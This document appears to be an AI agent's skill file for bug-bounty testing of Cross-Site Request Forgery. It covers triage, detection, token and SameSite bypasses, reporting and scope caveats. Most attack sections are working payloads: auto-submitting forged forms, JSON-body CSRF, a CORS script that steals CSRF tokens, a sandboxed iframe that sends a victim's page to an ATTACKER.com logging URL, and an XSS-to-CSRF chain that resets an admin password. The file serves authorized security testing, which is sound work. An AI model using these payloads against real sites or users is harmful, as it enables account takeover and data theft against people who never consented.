---
name: csrf
description: Cross-Site Request Forgery — state-changing requests, token bypass, SameSite bypass, CORS-based token leak, JSON body CSRF, and XSS-to-CSRF chains. Use when a state-changing endpoint lacks or has weak anti-CSRF protection, or when HauntMode flags CSRF as APPLIES/MAYBE.
---

# CSRF — Cross-Site Request Forgery

This skill covers detection, token bypass, SameSite evasion, CORS-assisted token theft, and chaining CSRF with XSS for account takeover. Read top to bottom on first invocation; jump to the relevant section on subsequent runs.

---

## 1. Triggers — when this skill applies

- Any state-changing request (profile update, password change, email change, role/admin toggle, payment, delete account, invite, promote) with no CSRF token
- CSRF token present but potentially bypassable: predictable value, not tied to session, only checked client-side, weak Referer/Origin check
- Session cookie with `SameSite=None` or no SameSite attribute
- App accepts GET for state-changing actions (vulnerable under SameSite=Lax)
- CORS misconfiguration present alongside a CSRF-protected endpoint — token can be stolen cross-origin
- XSS found anywhere on the same site — enables SameSite=Strict bypass or direct CSRF from victim context
- Login form with no CSRF token → login CSRF possible

---

---

## 3. 30-second triage

For every state-changing request intercepted in Burp:

1. Is there a CSRF token? If no → baseline CSRF PoC is likely to work immediately.
2. If yes → examine the token: is it random? Is it the same across sessions? Is it tied to the session? Is it just `md5(username)` or a timestamp?
3. Check the session cookie attributes: `SameSite=`, `HttpOnly`, `Secure`. Unset SameSite defaults to `Lax` in modern browsers.
4. Check the `Origin` and `Referer` headers in the request — is the app validating them? Test by removing or spoofing.
5. Check if the endpoint also accepts GET (try changing POST to GET in Burp — if it processes, Lax bypass is trivial).
6. Add `Origin: https://thisdoesnotexist.attacker.com` to the request and inspect the response — does it reflect back? → CORS misconfiguration to chain with.

---

## 4. Detection — confirming CSRF preconditions

**Requirement 1 — All parameters deterministic:**
All parameters the server needs to process the request must be known or guessable by the attacker. If there's a random CSRF token the attacker cannot read, check for bypass routes below.

**Requirement 2 — Session delivered via cookie:**
The browser will auto-attach the session cookie to cross-origin requests (subject to SameSite). If auth is bearer-only (Authorization header), standard CSRF forms won't work — but XHR/fetch-based CSRF can still work if CORS allows it.

**SameSite check:**
- `SameSite=None; Secure` → cookies sent with all cross-site requests → plain CSRF PoC works
- `SameSite=Lax` or unset → cookies sent only on top-level safe (GET) navigation → test if action accepts GET, or use client-side redirect bypass
- `SameSite=Strict` → cookies never sent cross-site → requires XSS on same site or client-side redirect pivot

---

## 5. PoC HTML templates

### 5.1 Basic POST CSRF (no token, SameSite=None or old browser)

```html
<html>
<body>
  <form id="csrf" action="https://TARGET.com/profile/update" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="full_name" value="PWNED" />
  </form>
  <script>document.getElementById("csrf").submit();</script>
</body>
</html>
```

### 5.2 GET-based CSRF (works under SameSite=Lax if endpoint accepts GET)

```html
<html>
<body>
  <script>
    document.location = "https://TARGET.com/profile/update?email=attacker@evil.com&action=save";
  </script>
</body>
</html>
```

Or as an image tag (silent, no navigation):
```html
<img src="https://TARGET.com/action?promote=1&uid=VICTIM_ID" style="display:none">
```

### 5.3 JSON body CSRF via text/plain enctype

Use when the endpoint only accepts `Content-Type: application/json` but does not strictly enforce it:

```html
<html>
<body>
  <form id="csrf" action="https://TARGET.com/api/profile" method="POST" enctype="text/plain">
    <input type="hidden" name='{"email":"attacker@evil.com","dummy' value='":"x"}' />
  </form>
  <script>document.getElementById("csrf").submit();</script>
</body>
</html>
```

The resulting body will be: `{"email":"attacker@evil.com","dummy=":"x"}` — valid JSON if the server parses loosely.

### 5.4 Multipart CSRF (for multipart/form-data endpoints)

```html
<html>
<body>
  <form id="csrf" action="https://TARGET.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="action" value="delete_account" />
    <input type="hidden" name="confirm" value="yes" />
  </form>
  <script>document.getElementById("csrf").submit();</script>
</body>
</html>
```

---

## 6. Token bypass techniques

### 6.1 Remove the token entirely

Intercept the request in Burp and delete the `csrf` parameter and its value. If the server processes the request anyway, the protection is decoration only.

### 6.2 Use another user's (your own) valid token

If the token is not tied to the session, a token from your own authenticated session will be accepted for any user's request. Add your token to the CSRF PoC.

### 6.3 Predict / brute-force weak tokens

Common weak patterns:
- `md5(username)` → calculate: `echo -n USERNAME | md5sum`
- `sha1(username)` → calculate: `echo -n USERNAME | sha1sum`
- Unix timestamp of last profile page load → hardcode a guess within a ±5 minute window

```html
<!-- Timestamp brute-force example -->
<html><body>
<form method="GET" action="https://TARGET.com/profile.php">
  <input type="hidden" name="promote" value="victim_user" />
  <input type="hidden" name="csrf" value="1720000000" />
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

Update the token value and re-deliver for each guess.

### 6.4 Referer/Origin header bypass

If the app checks the `Referer` header for substring `target.com`:
- Host your PoC at: `https://attacker.com/exploit/target.com/index.html`
- The Referer will contain `target.com` and pass the suffix/substring check.

Add `<meta name="referrer" content="never">` to suppress the Referer entirely — if the app doesn't enforce its presence, this bypasses the check.

### 6.5 CORS-based token theft (bypass proper CSRF tokens)

**Preconditions:** CORS misconfiguration reflects arbitrary origins + `Access-Control-Allow-Credentials: true` + session cookie has `SameSite=None; Secure`.

Step 1: Confirm CORS misconfiguration — add `Origin: https://evil.com` to the request and verify it reflects in `Access-Control-Allow-Origin`.

Step 2: Host this payload on your attack server and deliver to victim:

```html
<script>
  // Step 1: Steal the CSRF token from victim's session
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://TARGET.com/profile', false);
  xhr.withCredentials = true;
  xhr.send();
  var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
  var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

  // Step 2: Submit the state-changing request with the stolen token
  var csrf_req = new XMLHttpRequest();
  var params = 'promote=htb-stdnt&csrf=' + csrftoken;
  csrf_req.open('POST', 'https://TARGET.com/profile', false);
  csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  csrf_req.withCredentials = true;
  csrf_req.send(params);
</script>
```

Adjust `doc.getElementById('csrf_token')` to match the actual token element ID in the source.

### 6.6 Null origin bypass

If the server trusts `Access-Control-Allow-Origin: null`, deliver from a sandboxed iframe:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://TARGET.com/profile', true);
    xhr.withCredentials = true;
    xhr.onload = function() {
      location = 'https://ATTACKER.com/log?data=' + btoa(xhr.responseText);
    };
    xhr.send();
  </script>">
</iframe>
```

---

## 7. SameSite bypass techniques

### 7.1 Lax bypass — GET-accepting state-changing endpoint

SameSite=Lax allows cookies on top-level GET navigation. If a POST action also accepts GET:

```html
<script>document.location = "https://TARGET.com/promote?uid=MYUID&role=admin";</script>
```

### 7.2 Lax bypass — client-side redirect pivot

If the target site has a page that performs a client-side redirect (HTML `<meta refresh>` or `window.location =`) and echoes a URL parameter into the redirect destination:

```html
<script>
  // Victim navigates to /redirect.php which does a meta-refresh to ?next= param
  // We smuggle our CSRF GET params via URL encoding of &
  document.location = "https://TARGET.com/redirect.php?user=victim%26promote=MYUID";
</script>
```

Key: `%26` is `&` — the redirect copies the entire `user` value into the redirect URL, delivering our parameter.

**This only works with client-side redirects (meta refresh, JS location=), NOT HTTP 3xx redirects.**

### 7.3 Strict bypass — XSS on a subdomain

SameSite=Strict blocks cross-site cookies, but subdomains are same-site. If `sub.target.com` has XSS:

```html
<!-- Inject into sub.target.com via XSS -->
<script>
  var csrf_req = new XMLHttpRequest();
  var params = 'promote=MYUID';
  csrf_req.open('POST', 'https://target.com/profile', false);
  csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  csrf_req.withCredentials = true;
  csrf_req.send(params);
</script>
```

Because the request originates from `sub.target.com`, it is SameSite to `target.com`, so the Strict cookie is sent.

---

## 8. Login CSRF

If the login form has no CSRF protection, an attacker can log the victim into the attacker's account:

```html
<html><body>
<form id="csrf" action="https://TARGET.com/login" method="POST">
  <input type="hidden" name="username" value="attacker_account" />
  <input type="hidden" name="password" value="attacker_password" />
</form>
<script>document.getElementById("csrf").submit();</script>
</body></html>
```

Impact: victim uses attacker's session → all activity (searches, saved data, payment methods) recorded in attacker's account. Escalatable to stored XSS delivery, OAuth account linking takeover.

---

## 9. XSS + CSRF chain (account takeover)

When XSS is present and the password-change endpoint requires no old password or just a CSRF token:

```js
// Payload served from exploit server, loaded by XSS
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

var csrf_req = new XMLHttpRequest();
var params = 'username=admin&email=attacker@evil.com&password=p@ssw0rd&csrf_token=' + csrftoken;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

This is a full ATO chain: Stored XSS (loaded by admin) → extract CSRF token from admin's active session → submit password change as admin → login as admin.

---

## 10. Confirmation — valid PoC

A CSRF is confirmed when:
1. The state change actually occurs on the victim's account (check their profile/data post-delivery)
2. No prior knowledge of the victim's credentials or session token was needed
3. The PoC page was hosted on a different origin than the target

For testing against your own account: open the PoC in a second browser/private window where you are logged in, deliver to yourself, and verify the change took effect.

---

## 11. False-positive checks

Do not report CSRF if:
- The action is not a state change (read-only endpoints are not CSRF-able in the traditional sense)
- The app requires re-authentication (current password, MFA step) before the sensitive action — that adds a secret the attacker cannot forge
- `SameSite=Strict` is set AND no XSS or client-side redirect bypass exists — document the defense, note the attack is mitigated
- The CSRF token is properly random, tied to the session, and validated server-side, and no CORS misconfiguration exists to steal it — don't report a "theoretical" bypass without a working PoC
- The request uses a custom header (e.g. `X-Requested-With: XMLHttpRequest`) — this triggers CORS preflight, preventing simple cross-site form submission (still beatable with CORS misconfiguration, but document that requirement)

---

## 12. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| CSRF → privilege escalation (promote to admin) | `idor`, `auth-bypass` | Full admin takeover |
| CSRF → account takeover (email/password change) | `xss` (to deliver) | ATO |
| Login CSRF → OAuth account linking | `auth-bypass` | Persistent account takeover |
| CORS misconfiguration → CSRF token theft → CSRF | `cors` | Bypasses CSRF protection entirely |
| XSS on subdomain → SameSite=Strict bypass → CSRF | `xss` | Escalates XSS to ATO chain |
| Self-XSS + CSRF delivery → stored-XSS to admin | `xss` | Elevates self-XSS severity |
| CSRF → stored XSS injection via profile field update | `xss` | Attacker-triggered admin XSS |
| CSRF + clickjacking (frameable target) | `clickjacking` | Lures victim to interact |

---

## 13. Reporting template

```
POTENTIAL FINDING: Cross-Site Request Forgery
Target: <full URL of vulnerable endpoint>
Method: <GET | POST | PUT | DELETE>
Parameter: <parameter names included in forged request>
Token protection: <none | present — bypassed via: [remove/predict/CORS steal/Referer bypass/text/plain JSON]>
SameSite: <None | Lax | Strict | unset>  Cookie: <name>
Working PoC: [attached / paste HTML here]
Evidence:
  <screenshot of state change occurring on victim account after PoC delivery>
Impact:
  <e.g. "Unauthenticated attacker can promote any user to admin by tricking them to visit one URL">
  <e.g. "Attacker can change victim's email address and trigger password reset, achieving full ATO">
Chain potential: <list combined findings, e.g. "XSS delivery on subdomain bypasses SameSite=Strict">
Next step: <confirm in scope per program-guidelines.txt, develop full ATO demo if account takeover path exists>
```

---

## 14. Recon tracker vector strings

Only log if user explicitly instructs (CLAUDE.md hard rule). Suggested tags:

- `csrf:no-token:<endpoint>` — confirmed no CSRF protection
- `csrf:weak-token:<method>` — token present but bypassable via named method
- `csrf:samesite-lax-get` — SameSite=Lax + GET accepted for state change
- `csrf:cors-token-steal` — CORS misconfiguration enables token theft
- `csrf:login` — login form CSRF (no token)
- `csrf:confirmed:<endpoint>` — full working PoC delivered
- `csrf:blocked-samesite-strict` — SameSite=Strict blocks and no bypass found

---

## 15. What NOT to do

- Do not submit CSRF PoCs that perform irreversible actions (delete account, transfer funds, send bulk emails) — use a reversible state change (email update, profile field change) for the PoC
- Do not report "CSRF possible in theory" without a working PoC that demonstrates the state change
- Do not test CSRF on logout endpoints as a standalone finding — logout CSRF is generally informational only
- Do not assume `SameSite=Lax` means fully protected — check whether any state-changing endpoints accept GET, and check for client-side redirect gadgets
- Do not auto-log findings to the recon tracker without explicit user instruction
- Do not test CORS against third-party APIs — flag and stop
- Do not re-read scope.txt is not an option — re-read it before delivering any PoC
